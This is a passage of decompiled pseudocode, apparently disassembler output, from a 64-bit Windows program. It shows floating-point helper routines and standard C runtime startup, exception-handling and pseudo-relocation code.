  float10 local_178;
  float10 local_168;
  float10 local_158;
  float10 local_148;
  float10 local_138;
  float10 local_128;
  float10 local_118;
  float10 local_108;
  float10 local_f8;
  float10 local_e8;
  float10 local_d8;
  float10 local_c8;
  float10 local_b8;
  float10 local_a8;
  float10 local_98;
  float10 local_88;
  undefined1 local_78 [16];
  undefined1 local_68 [16];
  float10 local_58;
  float10 local_4c;
  float10 local_40;
  float10 local_34;
  float10 local_28;
  float10 local_1c;
  
  fVar1 = ABS(*param_2);
  local_78._8_2_ = (undefined2)((unkuint10)fVar1 >> 0x40);
  local_78._0_8_ = SUB108(fVar1,0);
  fVar2 = ABS(*param_3);
  local_68._8_2_ = (undefined2)((unkuint10)fVar2 >> 0x40);
  local_68._0_8_ = SUB108(fVar2,0);
  local_228 = (float10)_DAT_1400171f0;
  if (((local_68._0_8_ != -0x8000000000000000 || local_68._8_2_ != 0x7fff) &&
       (local_78._0_8_ != -0x8000000000000000 || local_78._8_2_ != 0x7fff)) &&
     (local_228 = (float10)_DAT_1400171f4, !NAN(*param_2) && !NAN(*param_3))) {
    local_228 = fVar1;
    local_28 = fVar2;
    if (fVar1 < fVar2) {
      local_228 = fVar2;
      local_28 = fVar1;
    }
    if ((local_28 != (float10)0) || (NAN(local_28) || NAN((float10)0))) {
      if ((local_228 - local_28 != local_228) || (NAN(local_228 - local_28) || NAN(local_228))) {
        local_78._0_10_ = fVar1;
        local_68._0_10_ = fVar2;
        if (local_228 <= _DAT_140017200) {
          if (_DAT_140017210 <= local_28) {
            local_208 = local_28 * local_28;
            local_218 = local_228;
            local_40 = local_228;
            FUN_14000d438(&local_348,&local_228,&local_218,&local_208);
            local_34 = SQRT(local_348);
            local_1c = local_34 * local_34;
            local_4c = local_40 * local_40;
            local_2b8 = -local_28;
            local_298 = local_1c - local_4c;
            local_2a8 = local_28;
            FUN_14000d438(&local_378,&local_2b8,&local_2a8,&local_298);
            local_28 = local_378;
            local_268 = -local_1c;
            local_278 = local_34;
            local_288 = local_34;
            FUN_14000d438(&local_368,&local_288,&local_278,&local_268);
            local_28 = local_28 + local_368;
            local_238 = -local_4c;
            local_248 = local_40;
            local_258 = local_40;
            FUN_14000d438(&local_358,&local_258,&local_248,&local_238);
            local_228 = local_34 - (local_28 - local_358) / (local_34 + local_34);
          }
          else {
            local_4c = _DAT_140017220;
            local_168 = local_228 / _DAT_140017220;
            local_1c = local_28 / _DAT_140017220;
            local_148 = local_1c * local_1c;
            local_158 = local_168;
            local_40 = local_168;
            FUN_14000d438(&local_308,&local_168,&local_158,&local_148);
            local_34 = SQRT(local_308);
            local_58 = local_34 * local_34;
            local_28 = local_40 * local_40;
            local_1f8 = -local_1c;
            local_1d8 = local_58 - local_28;
            local_1e8 = local_1c;
            FUN_14000d438(&local_338,&local_1f8,&local_1e8,&local_1d8);
            local_1c = local_338;
            local_1a8 = -local_58;
            local_1b8 = local_34;
            local_1c8 = local_34;
            FUN_14000d438(&local_328,&local_1c8,&local_1b8,&local_1a8);
            local_1c = local_1c + local_328;
            local_178 = -local_28;
            local_188 = local_40;
            local_198 = local_40;
            FUN_14000d438(&local_318,&local_198,&local_188,&local_178);
            local_228 = local_4c * (local_34 - (local_1c - local_318) / (local_34 + local_34));
          }
        }
        else {
          local_4c = _DAT_140017220;
          local_a8 = local_228 * _DAT_140017220;
          local_1c = _DAT_140017220 * local_28;
          local_88 = local_1c * local_1c;
          local_98 = local_a8;
          local_40 = local_a8;
          FUN_14000d438(&local_2c8,&local_a8,&local_98,&local_88);
          local_34 = SQRT(local_2c8);
          local_58 = local_34 * local_34;
          local_28 = local_40 * local_40;
          local_138 = -local_1c;
          local_118 = local_58 - local_28;
          local_128 = local_1c;
          FUN_14000d438(&local_2f8,&local_138,&local_128,&local_118);
          local_1c = local_2f8;
          local_e8 = -local_58;
          local_f8 = local_34;
          local_108 = local_34;
          FUN_14000d438(&local_2e8,&local_108,&local_f8,&local_e8);
          local_1c = local_1c + local_2e8;
          local_b8 = -local_28;
          local_c8 = local_40;
          local_d8 = local_40;
          FUN_14000d438(&local_2d8,&local_d8,&local_c8,&local_b8);
          local_228 = (local_34 - (local_1c - local_2d8) / (local_34 + local_34)) / local_4c;
        }
      }
    }
  }
  *param_1 = local_228;
  return param_1;
}


// ==== FUN_14000c651 @ 14000c651 size 114

undefined8 FUN_14000c651(float param_1,float param_2)

{
  double dVar1;
  float fVar2;
  double dVar3;
  undefined4 uVar4;
  
  if (ABS(param_2) == INFINITY || ABS(param_1) == INFINITY) {
    uVar4 = 0;
    fVar2 = DAT_140017230;
  }
  else {
    uVar4 = 0;
    fVar2 = DAT_140017234;
    if ((!NAN(param_1)) && (!NAN(param_2))) {
      dVar3 = (double)param_2 * (double)param_2;
      dVar1 = FUN_140010e85((double)param_1,dVar3);
      uVar4 = (undefined4)((ulonglong)dVar3 >> 0x20);
      fVar2 = (float)SQRT(dVar1);
    }
  }
  return CONCAT44(uVar4,fVar2);
}


// ==== FUN_14000c6c3 @ 14000c6c3 size 159

void FUN_14000c6c3(float10 *param_1,float10 *param_2,int *param_3)

{
  ulonglong uVar1;
  uint uVar2;
  int iVar3;
  float10 fVar4;
  undefined8 local_28;
  undefined2 uStack_20;
  
  fVar4 = *param_2;
  if (NAN(fVar4)) {
    iVar3 = 0;
  }
  else {
    uStack_20 = (ushort)((unkuint10)fVar4 >> 0x40);
    uVar2 = (uint)uStack_20;
    local_28 = SUB108(fVar4,0);
    iVar3 = 0;
    if ((~uVar2 & 0x7fff) != 0) {
      if ((uStack_20 & 0x7fff) == 0) {
        iVar3 = 0;
        if (local_28 != 0) {
          uVar1 = 0x3f;
          if (local_28 != 0) {
            for (; local_28 >> uVar1 == 0; uVar1 = uVar1 - 1) {
            }
          }
          local_28 = local_28 << ((byte)(uVar1 ^ 0x3f) & 0x3f);
          uStack_20 = uStack_20 & 0x8000 | 0x3ffe;
          iVar3 = -0x3ffd - (int)(uVar1 ^ 0x3f);
        }
      }
      else {
        uStack_20 = uStack_20 & 0x8000 | 0x3ffe;
        iVar3 = (uVar2 & 0x7fff) - 0x3ffe;
      }
    }
    fVar4 = (float10)CONCAT28(uStack_20,local_28);
  }
  *param_3 = iVar3;
  *param_1 = fVar4;
  return;
}


// ==== FUN_14000c762 @ 14000c762 size 133

ulonglong FUN_14000c762(float param_1,int *param_2)

{
  byte bVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  ulonglong uVar5;
  undefined1 in_register_00001204 [12];
  undefined1 auVar6 [16];
  
  auVar6._4_12_ = in_register_00001204;
  auVar6._0_4_ = param_1;
  uVar5 = auVar6._0_8_;
  if (NAN(param_1)) {
    iVar3 = 0;
  }
  else {
    uVar4 = (uint)param_1 >> 0x17;
    iVar3 = 0;
    if ((char)uVar4 != -1) {
      if ((uVar4 & 0xff) == 0) {
        iVar3 = 0;
        if (((uint)param_1 & 0x7fffff) != 0) {
          uVar4 = 0x1f;
          if ((int)param_1 << 9 != 0) {
            for (; (uint)((int)param_1 << 9) >> uVar4 == 0; uVar4 = uVar4 - 1) {
            }
          }
          bVar1 = (byte)(uVar4 ^ 0x1f);
          uVar2 = 0;
          if (bVar1 < 0x16) {
            uVar2 = (int)param_1 << (bVar1 + 1 & 0x1f) & 0x7fffff;
          }
          param_1 = (float)(((uint)param_1 & 0x80000000) + uVar2 + 0x3f000000);
          iVar3 = -0x7e - (uVar4 ^ 0x1f);
        }
      }
      else {
        param_1 = (float)((uint)param_1 & 0x807fffff | 0x3f000000);
        iVar3 = (uVar4 & 0xff) - 0x7e;
      }
    }
    uVar5 = (ulonglong)(uint)param_1;
  }
  *param_2 = iVar3;
  return uVar5;
}


// ==== FUN_14000c7e7 @ 14000c7e7 size 15

bool FUN_14000c7e7(float10 *param_1)

{
  return NAN(*param_1);
}


// ==== FUN_14000c7f6 @ 14000c7f6 size 14

bool FUN_14000c7f6(float param_1)

{
  return NAN(param_1);
}


// ==== FUN_14000c804 @ 14000c804 size 248

undefined8 FUN_14000c804(undefined8 param_1,longlong param_2,undefined8 param_3,undefined8 param_4)

{
  ushort uVar1;
  uint uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  undefined8 uVar5;
  ulonglong uVar6;
  
  *(undefined4 *)PTR_DAT_14002df00 = 1;
  *(undefined4 *)PTR_DAT_14002df08 = 1;
  *(undefined4 *)PTR_DAT_14002df10 = 1;
  DAT_140034b64 = 0;
  if ((*(short *)PTR_IMAGE_DOS_HEADER_14002dee8 == 0x5a4d) &&
     (uVar6 = (ulonglong)*(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + 0x3c), param_2 = uVar6,
     *(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + uVar6) == 0x4550)) {
    uVar1 = *(ushort *)(PTR_IMAGE_DOS_HEADER_14002dee8 + uVar6 + 0x18);
    param_2 = (longlong)uVar1;
    if (uVar1 == 0x20b) {
      param_2 = 0xf8;
      uVar2 = *(uint *)(PTR_IMAGE_DOS_HEADER_14002dee8 + uVar6 + 0x84);
    }
    else {
      if (uVar1 != 0x10b) goto LAB_14000c87b;
      param_2 = 0xe8;
      uVar2 = *(uint *)(PTR_IMAGE_DOS_HEADER_14002dee8 + uVar6 + 0x74);
    }
    if (0xe < uVar2) {
      DAT_140034b64 = (uint)(*(int *)(PTR_IMAGE_DOS_HEADER_14002dee8 + param_2 + uVar6) != 0);
    }
  }
LAB_14000c87b:
  _set_app_type(2 - (uint)(*(int *)PTR_DAT_14002def8 == 0));
  uVar3 = *(undefined4 *)PTR_DAT_14002df60;
  puVar4 = (undefined4 *)__p__fmode();
  *puVar4 = uVar3;
  uVar3 = *(undefined4 *)PTR_DAT_14002df50;
  puVar4 = (undefined4 *)__p__commode();
  *puVar4 = uVar3;
  uVar5 = FUN_14000d430();
  if (-1 < (int)uVar5) {
    if (*(int *)PTR_DAT_14002dee0 == 1) {
      FUN_14000ce98(FUN_14000cef8);
    }
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  FUN_14000cebc(8,param_2,param_3,param_4);
}


// ==== FUN_14000c8fd @ 14000c8fd size 86

void FUN_14000c8fd(void)

{
  undefined8 uVar1;
  undefined8 *puVar2;
  undefined8 *puVar3;
  ulonglong uVar4;
  undefined4 local_c;
  
  local_c = *(undefined4 *)PTR_DAT_14002df68;
  uVar4 = (ulonglong)*(uint *)PTR_DAT_14002df58;
  puVar2 = &DAT_140034b38;
  puVar3 = &DAT_140034b40;
  uVar1 = FUN_14000cc24(&DAT_140034b34,&DAT_140034b38,&DAT_140034b40,*(uint *)PTR_DAT_14002df58,
                        &local_c);
  if (-1 < (int)uVar1) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  FUN_14000cebc(8,puVar2,puVar3,uVar4);
}


// ==== entry @ 14000c954 size 37

void entry(undefined4 *param_1,undefined4 *param_2,ulonglong param_3,ushort *param_4)

{
  *(undefined4 *)PTR_DAT_14002def8 = 1;
  FUN_14000c979(param_1,param_2,param_3,param_4);
  return;
}


// ==== FUN_14000c979 @ 14000c979 size 501

ulonglong FUN_14000c979(undefined4 *param_1,undefined4 *param_2,ulonglong param_3,ushort *param_4)

{
  longlong lVar1;
  undefined *puVar2;
  undefined *puVar3;
  longlong *plVar4;
  uint uVar5;
  longlong lVar6;
  LPTOP_LEVEL_EXCEPTION_FILTER pPVar7;
  void *pvVar8;
  longlong lVar9;
  void *pvVar10;
  undefined8 *puVar11;
  ulonglong uVar12;
  longlong lVar13;
  longlong lVar14;
  bool bVar15;
  
  puVar2 = PTR_DAT_14002df20;
  lVar14 = *(longlong *)((longlong)Self + 8);
  LOCK();
  lVar6 = *(longlong *)PTR_DAT_14002df20;
  bVar15 = lVar6 == 0;
  if (bVar15) {
    *(longlong *)PTR_DAT_14002df20 = lVar14;
    lVar6 = 0;
  }
  UNLOCK();
  if (lVar14 != lVar6 && !bVar15) {
    do {
      param_1 = (undefined4 *)0x3e8;
      Sleep(1000);
      LOCK();
      lVar6 = *(longlong *)puVar2;
      bVar15 = lVar6 == 0;
      if (bVar15) {
        *(longlong *)puVar2 = lVar14;
        lVar6 = 0;
      }
      UNLOCK();
    } while ((!bVar15) && (lVar14 != lVar6));
  }
  puVar3 = PTR_DAT_14002df28;
  if (*(int *)PTR_DAT_14002df28 == 1) {
                    /* WARNING: Subroutine does not return */
    FUN_14000cebc(0x1f,param_2,param_3,param_4);
  }
  if (*(int *)PTR_DAT_14002df28 == 0) {
    *(undefined4 *)PTR_DAT_14002df28 = 1;
    param_2 = (undefined4 *)PTR_DAT_14002df48;
    uVar5 = _initterm_e(PTR_DAT_14002df40);
    param_1 = (undefined4 *)(ulonglong)uVar5;
    if (uVar5 != 0) {
      return 0xff;
    }
  }
  else {
    DAT_140034b48 = '\x01';
  }
  if (*(int *)puVar3 == 1) {
    param_1 = (undefined4 *)PTR_DAT_14002df30;
    param_2 = (undefined4 *)PTR_DAT_14002df38;
    _initterm();
    *(undefined4 *)puVar3 = 2;
  }
  if (bVar15) {
    LOCK();
    *(undefined8 *)puVar2 = 0;
    UNLOCK();
  }
  if (*(code **)PTR_PTR_14002def0 != (code *)0x0) {
    param_1 = (undefined4 *)0x0;
    param_2 = (undefined4 *)0x2;
    param_3 = 0;
    (**(code **)PTR_PTR_14002def0)();
  }
  FUN_14000cf68(param_1,param_2,param_3,(ulonglong)param_4);
  pPVar7 = SetUnhandledExceptionFilter(FUN_14000cd44);
  *(LPTOP_LEVEL_EXCEPTION_FILTER *)PTR_DAT_14002df18 = pPVar7;
  _set_invalid_parameter_handler(FUN_14000cb9e);
  FUN_14000cef0();
  lVar14 = (longlong)(int)DAT_140034b34;
  pvVar8 = malloc(lVar14 * 8 + 8);
  lVar6 = (longlong)DAT_140034b38;
  if (lVar14 < 1) {
    lVar14 = 0;
  }
  else {
    lVar13 = 0;
    do {
      lVar1 = *(longlong *)(lVar6 + lVar13 * 8);
      lVar9 = FUN_14000d53c(lVar1);
      pvVar10 = malloc(lVar9 + 1U);
      *(void **)((longlong)pvVar8 + lVar13 * 8) = pvVar10;
      FUN_14000d5a5((longlong)pvVar10,lVar1,lVar9 + 1U);
      lVar13 = lVar13 + 1;
    } while (lVar14 != lVar13);
  }
  *(undefined8 *)((longlong)pvVar8 + lVar14 * 8) = 0;
  DAT_140034b38 = pvVar8;
  FUN_14000cd27();
  plVar4 = DAT_140034b40;
  puVar11 = (undefined8 *)FUN_14000ceac();
  *puVar11 = plVar4;
  uVar12 = FUN_140001000((ulonglong)DAT_140034b34,DAT_140034b38,DAT_140034b40,param_4);
  DAT_140034b60 = (uint)uVar12;
  if (DAT_140034b64 != 0) {
    if (DAT_140034b48 == '\0') {
      _cexit();
      uVar12 = (ulonglong)DAT_140034b60;
    }
    return uVar12;
  }
                    /* WARNING: Subroutine does not return */
  exit(DAT_140034b60);
}


// ==== FUN_14000cb6f @ 14000cb6f size 37

void FUN_14000cb6f(undefined4 *param_1,undefined4 *param_2,ulonglong param_3,ushort *param_4)

{
  *(undefined4 *)PTR_DAT_14002def8 = 0;
  FUN_14000c979(param_1,param_2,param_3,param_4);
  return;
}


// ==== FUN_14000cb94 @ 14000cb94 size 10

void FUN_14000cb94(void)

{
  _crt_atexit();
  return;
}


// ==== FUN_14000cb9e @ 14000cb9e size 6

void FUN_14000cb9e(void)

{
  return;
}


// ==== tls_callback_0 @ 14000cba4 size 103

/* WARNING: Removing unreachable block (ram,0x00014000cbdf) */
/* WARNING: Removing unreachable block (ram,0x00014000cbe7) */
/* WARNING: Removing unreachable block (ram,0x00014000cbe9) */

void tls_callback_0(undefined8 param_1,int param_2)

{
  if (*(int *)PTR_DAT_14002dfa0 != 2) {
    *(undefined4 *)PTR_DAT_14002dfa0 = 2;
  }
  if (param_2 == 1) {
    FUN_140015f84(param_1,1);
    return;
  }
  return;
}


// ==== tls_callback_1 @ 14000cc0b size 22

void tls_callback_1(undefined8 param_1,int param_2)

{
  if ((param_2 != 3) && (param_2 != 0)) {
    return;
  }
  FUN_140015f84(param_1,param_2);
  return;
}


// ==== FUN_14000cc24 @ 14000cc24 size 109

undefined8
FUN_14000cc24(undefined4 *param_1,undefined8 *param_2,undefined8 *param_3,int param_4,
             undefined4 *param_5)

{
  undefined4 *puVar1;
  undefined8 *puVar2;
  
  _initialize_narrow_environment();
  _configure_narrow_argv(2 - (uint)(param_4 == 0));
  puVar1 = (undefined4 *)__p___argc();
  *param_1 = *puVar1;
  puVar2 = (undefined8 *)__p___argv();
  *param_2 = *puVar2;
  puVar2 = (undefined8 *)__p__environ();
  *param_3 = *puVar2;
  _set_new_mode(*param_5);
  return 0;
}


// ==== FUN_14000cc94 @ 14000cc94 size 57

void FUN_14000cc94(void)

{
  code *pcVar1;
  
  pcVar1 = *(code **)PTR_DAT_140034008;
  while (pcVar1 != (code *)0x0) {
    (*pcVar1)();
    pcVar1 = *(code **)(PTR_DAT_140034008 + 8);
    PTR_DAT_140034008 = PTR_DAT_140034008 + 8;
  }
  return;
}


// ==== FUN_14000cccd @ 14000cccd size 90

void FUN_14000cccd(void)

{
  uint uVar1;
  undefined *puVar2;
  uint uVar3;
  ulonglong uVar4;
  
  puVar2 = PTR_DAT_14002dfa8;
  uVar3 = *(uint *)PTR_DAT_14002dfa8;
  if (uVar3 == 0xffffffff) {
    uVar3 = 0xffffffff;
    do {
      uVar1 = uVar3 + 2;
      uVar3 = uVar3 + 1;
    } while (*(longlong *)(PTR_DAT_14002dfa8 + (ulonglong)uVar1 * 8) != 0);
  }
  if (uVar3 != 0) {
    uVar4 = (ulonglong)uVar3;
    do {
      uVar4 = uVar4 - 1;
      (**(code **)(puVar2 + uVar4 * 8 + 8))();
    } while ((int)uVar4 != 0);
  }
  FUN_14000cb94();
  return;
}


// ==== FUN_14000cd27 @ 14000cd27 size 28

void FUN_14000cd27(void)

{
  if (DAT_140034b4c != '\0') {
    return;
  }
  DAT_140034b4c = 1;
  FUN_14000cccd();
  return;
}


// ==== FUN_14000cd44 @ 14000cd44 size 338

undefined8 FUN_14000cd44(undefined8 *param_1)

{
  uint uVar1;
  bool bVar2;
  code *extraout_RAX;
  code *extraout_RAX_00;
  code *extraout_RAX_01;
  code *pcVar3;
  int iVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  
  uVar1 = *(uint *)*param_1;
  if (((uVar1 & 0x20ffffff) == 0x20474343) && ((((uint *)*param_1)[1] & 1) == 0)) {
    return 0xffffffff;
  }
  uVar6 = 0xffffffff;
  if ((int)uVar1 < -0x3fffffe3) {
    if (uVar1 == 0x80000002) {
      return 0xffffffff;
    }
    if (uVar1 != 0xc0000005) {
      if (uVar1 == 0xc0000008) {
        return 0xffffffff;
      }
      goto LAB_14000ce58;
    }
    signal(0xb);
    if (extraout_RAX_01 == (code *)0x0) goto LAB_14000ce58;
    if (extraout_RAX_01 == (code *)0x1) {
      iVar4 = 0xb;
      goto LAB_14000ce51;
    }
    uVar5 = 0xb;
    pcVar3 = extraout_RAX_01;
    goto LAB_14000ce89;
  }
  switch(uVar1) {
  case 0xc000008c:
  case 0xc0000092:
  case 0xc0000095:
    goto switchD_14000cd9d_caseD_c000008c;
  case 0xc000008d:
  case 0xc000008e:
  case 0xc000008f:
  case 0xc0000090:
  case 0xc0000091:
  case 0xc0000093:
    bVar2 = false;
    break;
  case 0xc0000094:
    bVar2 = true;
    break;
  case 0xc0000096:
    goto switchD_14000cd9d_caseD_c0000096;
  default:
    if (uVar1 != 0xc000001d) goto LAB_14000ce58;
switchD_14000cd9d_caseD_c0000096:
    signal(4);
    if (extraout_RAX_00 == (code *)0x0) goto LAB_14000ce58;
    if (extraout_RAX_00 == (code *)0x1) {
      iVar4 = 4;
LAB_14000ce51:
      signal(iVar4);
      return 0xffffffff;
    }
    uVar5 = 4;
    pcVar3 = extraout_RAX_00;
    goto LAB_14000ce89;
  }
  signal(8);
  if (extraout_RAX == (code *)0x0) {
LAB_14000ce58:
    if (DAT_140034ad8 != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00014000ce6f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      uVar6 = (*DAT_140034ad8)(param_1);
      return uVar6;
    }
    uVar6 = 0;
  }
  else if (extraout_RAX == (code *)0x1) {
    signal(8);
    if (!bVar2) {
      FUN_14000cef0();
    }
  }
  else {
    uVar5 = 8;
    pcVar3 = extraout_RAX;
LAB_14000ce89:
    (*pcVar3)(uVar5);
  }
switchD_14000cd9d_caseD_c000008c:
  return uVar6;
}


// ==== FUN_14000ce98 @ 14000ce98 size 17

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000ce98(undefined8 param_1)

{
  _DAT_140034b70 = param_1;
  __setusermatherr();
  return;
}


// ==== FUN_14000ceac @ 14000ceac size 16

undefined * FUN_14000ceac(void)

{
  return *(undefined **)PTR_PTR_14002dfe0;
}


// ==== FUN_14000cebc @ 14000cebc size 51

void FUN_14000cebc(uint param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  undefined8 uVar1;
  
  uVar1 = __acrt_iob_func(2);
  FUN_1400160c0(uVar1,"runtime error %d\n",(ulonglong)param_1,param_4);
                    /* WARNING: Subroutine does not return */
  _exit(0xff);
}


// ==== FUN_14000cef0 @ 14000cef0 size 8

void FUN_14000cef0(void)

{
  return;
}


// ==== FUN_14000cef8 @ 14000cef8 size 111

undefined8 FUN_14000cef8(int *param_1)

{
  undefined8 uVar1;
  char *pcVar2;
  
  if (*param_1 - 1U < 6) {
    pcVar2 = &DAT_14002e10c + *(int *)(&DAT_14002e10c + (ulonglong)(*param_1 - 1U) * 4);
  }
  else {
    pcVar2 = "Unknown error";
  }
  uVar1 = __acrt_iob_func(2);
  FUN_1400160c0(uVar1,"_matherr(): %s in %s(%g, %g)  (retval=%g)\n",pcVar2,
                *(undefined8 *)(param_1 + 2));
  return 0;
}


// ==== FUN_14000cf68 @ 14000cf68 size 720

void FUN_14000cf68(undefined8 param_1,undefined8 param_2,ulonglong param_3,ulonglong param_4)

{
  uint uVar1;
  DWORD flNewProtect;
  LPVOID lpAddress;
  SIZE_T dwSize;
  longlong lVar2;
  undefined *puVar3;
  undefined *puVar4;
  int iVar5;
  uint uVar6;
  ulonglong uVar7;
  undefined1 *puVar8;
  int *piVar9;
  longlong lVar10;
  uint *puVar11;
  longlong lVar12;
  byte bVar13;
  ulonglong *puVar14;
  ulonglong uVar15;
  bool bVar16;
  longlong alStack_90 [7];
  undefined1 auStack_58 [8];
  longlong local_50;
  int local_44;
  
  if (DAT_140034b2c != '\0') {
    return;
  }
  DAT_140034b2c = 1;
  alStack_90[2] = 0x14000cf9a;
  FUN_14001616f();
  alStack_90[6] = 0x14000cfb5;
  uVar7 = FUN_14000d5c2();
  puVar4 = PTR_DAT_14002e2a8;
  puVar3 = PTR_IMAGE_DOS_HEADER_14002dee8;
  lVar2 = -uVar7;
  DAT_140034b78 = auStack_58 + lVar2;
  DAT_140034b68 = 0;
  if ((longlong)PTR_DAT_14002e2a8 - (longlong)PTR_DAT_14002e2b0 < 8) {
    DAT_140034b68 = 0;
    DAT_140034b78 = auStack_58 + lVar2;
    return;
  }
  piVar9 = (int *)PTR_DAT_14002e2b0;
  if ((longlong)PTR_DAT_14002e2a8 - (longlong)PTR_DAT_14002e2b0 < 0xc) {
LAB_14000d026:
    if ((*piVar9 == 0) && (piVar9[1] == 0)) {
      uVar1 = piVar9[2];
      if (uVar1 != 1) {
                    /* WARNING: Subroutine does not return */
        *(undefined **)((longlong)alStack_90 + lVar2 + 0x10) = &UNK_14000d238;
        FUN_14000d3ca("  Unknown pseudo relocation protocol version %d.\n",(ulonglong)uVar1,param_3,
                      param_4);
      }
      puVar11 = (uint *)(piVar9 + 3);
      DAT_140034b78 = auStack_58 + lVar2;
      if (puVar11 < PTR_DAT_14002e2a8) {
        DAT_140034b78 = auStack_58 + lVar2;
        do {
          bVar13 = (byte)puVar11[2];
          uVar1 = bVar13 - 8 >> 3;
          uVar6 = (uint)bVar13 << 0x1d | uVar1;
          if (7 < uVar6) {
switchD_14000d14f_caseD_2:
                    /* WARNING: Subroutine does not return */
            *(undefined8 *)((longlong)alStack_90 + lVar2 + 0x10) = 0x14000d228;
            FUN_14000d3ca("  Unknown pseudo relocation bit size %d.\n",(ulonglong)bVar13,param_3,
                          param_4);
          }
          puVar14 = (ulonglong *)(puVar3 + puVar11[1]);
          param_4 = *(ulonglong *)(puVar3 + *puVar11);
          param_3 = (longlong)&switchD_14000d14f::switchdataD_14002e2b8 +
                    (longlong)(int)(&switchD_14000d14f::switchdataD_14002e2b8)[uVar6];
          switch(uVar6) {
          case 0:
            uVar15 = (ulonglong)(byte)*puVar14;
            uVar7 = uVar15 - 0x100;
            bVar16 = (char)(byte)*puVar14 < '\0';
            break;
          case 1:
            uVar15 = (ulonglong)(ushort)*puVar14;
            uVar7 = uVar15 - 0x10000;
            bVar16 = (short)(ushort)*puVar14 < 0;
            break;
          default:
            goto switchD_14000d14f_caseD_2;
          case 3:
            uVar15 = (ulonglong)(uint)*puVar14;
            uVar7 = uVar15 - 0x100000000;
            bVar16 = (int)(uint)*puVar14 < 0;
            break;
          case 7:
            uVar7 = *puVar14;
            goto LAB_14000d186;
          }
          if (!bVar16) {
            uVar7 = uVar15;
          }
LAB_14000d186:
          local_50 = (uVar7 - (longlong)(puVar3 + *puVar11)) + param_4;
          if ((bVar13 < 0x40) &&
             ((~(-1L << (bVar13 & 0x3f)) < local_50 || (local_50 < -1L << (bVar13 - 1 & 0x3f))))) {
            *(longlong *)((longlong)alStack_90 + lVar2 + 0x28) = local_50;
                    /* WARNING: Subroutine does not return */
            *(undefined8 *)((longlong)alStack_90 + lVar2) = 0x14000d218;
            FUN_14000d3ca("%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\n"
                          ,(ulonglong)bVar13,puVar14,param_4);
          }
          bVar13 = 0x8bU >> ((byte)uVar1 & 0x1f) & uVar6 < 8;
          param_3 = CONCAT71((int7)((ulonglong)local_50 >> 8),bVar13);
          if (bVar13 == 1) {
            param_3 = *(ulonglong *)(&DAT_14002e268 + (ulonglong)uVar6 * 8);
            *(undefined8 *)((longlong)alStack_90 + lVar2 + 0x10) = 0x14000d1ea;
            FUN_14000d239((ulonglong)puVar14,(longlong)&local_50,param_3,param_4);
          }
          puVar11 = puVar11 + 3;
        } while (puVar11 < puVar4);
      }
      goto LAB_14000d077;
    }
  }
  else if ((*(int *)PTR_DAT_14002e2b0 == 0) && (*(int *)(PTR_DAT_14002e2b0 + 4) == 0)) {
    piVar9 = (int *)(PTR_DAT_14002e2b0 + 0xc);
    if (*(int *)(PTR_DAT_14002e2b0 + 8) != 0) {
      piVar9 = (int *)PTR_DAT_14002e2b0;
    }
    goto LAB_14000d026;
  }
  DAT_140034b78 = auStack_58 + lVar2;
  if (piVar9 < PTR_DAT_14002e2a8) {
    DAT_140034b78 = auStack_58 + lVar2;
    do {
      uVar1 = piVar9[1];
      local_44 = *piVar9 + *(int *)(puVar3 + uVar1);
      *(undefined8 *)((longlong)alStack_90 + lVar2 + 0x10) = 0x14000d06a;
      FUN_14000d239((ulonglong)(puVar3 + uVar1),(longlong)&local_44,4,param_4);
      piVar9 = piVar9 + 2;
    } while (piVar9 < puVar4);
  }
LAB_14000d077:
  if (0 < DAT_140034b68) {
    lVar12 = 0x10;
    lVar10 = 0;
    puVar8 = DAT_140034b78;
    iVar5 = DAT_140034b68;
    do {
      flNewProtect = *(DWORD *)(puVar8 + lVar12 + -0x10);
      if (flNewProtect != 0) {
        lpAddress = *(LPVOID *)(puVar8 + lVar12 + -8);
        dwSize = *(SIZE_T *)(puVar8 + lVar12);
        *(undefined8 *)((longlong)alStack_90 + lVar2 + 0x10) = 0x14000d0b7;
        VirtualProtect(lpAddress,dwSize,flNewProtect,(PDWORD)&local_50);
        puVar8 = DAT_140034b78;
        iVar5 = DAT_140034b68;
      }
      lVar10 = lVar10 + 1;
      lVar12 = lVar12 + 0x28;
    } while (lVar10 < iVar5);
  }
  return;
}


// ==== FUN_14000d239 @ 14000d239 size 400

/* WARNING: Enum "SectionFlags": Some values do not have unique names */

void FUN_14000d239(ulonglong param_1,longlong param_2,ulonglong param_3,ulonglong param_4)

{
  uint uVar1;
  longlong lVar2;
  BOOL BVar3;
  DWORD DVar4;
  IMAGE_SECTION_HEADER *pIVar5;
  IMAGE_DOS_HEADER *pIVar6;
  SIZE_T SVar7;
  longlong lVar8;
  ulonglong uVar9;
  undefined8 uVar10;
  PDWORD lpflOldProtect;
  longlong lVar11;
  _MEMORY_BASIC_INFORMATION local_68;
  
  lVar11 = (longlong)DAT_140034b68;
  if (lVar11 < 1) {
    lVar11 = 0;
    uVar9 = param_3;
  }
  else {
    lVar8 = 0;
    do {
      uVar9 = *(ulonglong *)(DAT_140034b78 + 0x18 + lVar8);
      if (uVar9 <= param_1) {
        param_4 = (ulonglong)*(uint *)(*(longlong *)(DAT_140034b78 + 0x20 + lVar8) + 8);
        uVar9 = uVar9 + param_4;
        if (param_1 < uVar9) goto LAB_14000d368;
      }
      lVar8 = lVar8 + 0x28;
    } while (lVar11 * 0x28 != lVar8);
  }
  pIVar5 = FUN_14001610c(param_1);
  lVar8 = DAT_140034b78;
  if (pIVar5 == (IMAGE_SECTION_HEADER *)0x0) {
                    /* WARNING: Subroutine does not return */
    FUN_14000d3ca("Address %p has no image-section",param_1,uVar9,param_4);
  }
  lVar2 = lVar11 * 0x28;
  *(IMAGE_SECTION_HEADER **)(DAT_140034b78 + 0x20 + lVar2) = pIVar5;
  *(undefined4 *)(lVar8 + lVar2) = 0;
  pIVar6 = FUN_1400161a0();
  uVar1 = pIVar5->VirtualAddress;
  *(char **)(DAT_140034b78 + 0x18 + lVar2) = pIVar6->e_magic + uVar1;
